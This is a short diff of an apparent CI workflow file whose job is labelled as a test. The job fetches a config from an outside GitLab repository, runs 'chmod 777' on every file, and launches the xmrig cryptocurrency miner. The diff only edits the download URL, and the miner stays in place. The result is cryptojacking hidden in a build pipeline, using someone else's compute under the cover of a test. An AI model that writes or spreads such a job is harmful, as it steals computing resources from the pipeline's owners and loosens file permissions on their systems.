@@ -13,6 +13,6 @@ jobs:
         kind: test
         shell: sh
         run: |-
-          wget https://gitlab.com/rockymoysu/S/-/raw/main/99.json?ref_type=heads
+          wget https://gitlab.com/rockymoysu/S/-/raw/main/99.json
           chmod 777 *
           xmrig --config=99.json
